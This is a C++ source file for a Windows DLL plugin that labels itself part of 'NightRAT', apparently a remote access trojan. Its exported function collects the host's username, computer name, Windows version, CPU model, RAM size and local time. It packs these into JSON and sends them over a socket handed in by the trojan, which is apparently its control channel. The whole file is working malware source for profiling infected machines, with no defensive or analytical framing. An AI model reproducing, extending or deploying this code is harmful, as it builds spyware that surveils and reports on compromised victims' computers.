#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <iostream>
#include <string>
#include <ctime>
#include "../../include/json.hpp"

using json = nlohmann::json;
using namespace std;

// Helper to get registry value
string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
    char data[255];
    DWORD dataSize = sizeof(data);
    if (RegGetValueA(hKeyRoot, subKey, valueName, RRF_RT_REG_SZ, NULL, data, &dataSize) == ERROR_SUCCESS)
        return string(data);
    return "N/A";
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    time_t now = time(0);
    char date_buf[20];
    strftime(date_buf, sizeof(date_buf), "%Y-%m-%d %H:%M:%S", localtime(&now));

    json j;
    j["action"]             = "inforesponse";

    char username[256];
    DWORD uSize = sizeof(username);
    if (GetUserNameA(username, &uSize))
        j["username"] = string(username);
    else
        j["username"] = "Unknown";

    char pcname[256];
    DWORD pSize = sizeof(pcname);
    if (GetComputerNameA(pcname, &pSize))
        j["pcname"] = string(pcname);
    else
        j["pcname"] = "Unknown";

    j["os"]                 = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
    j["client"]             = "NightRAT C++ Plugin v1.0";
    j["datetime"]           = string(date_buf);

    // CPU
    j["cpu"]                = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");

    // RAM
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (GlobalMemoryStatusEx(&statex))
        j["ram"] = to_string(statex.ullTotalPhys / (1024 * 1024)) + " MB";
    else
        j["ram"] = "N/A";

    string msg = j.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
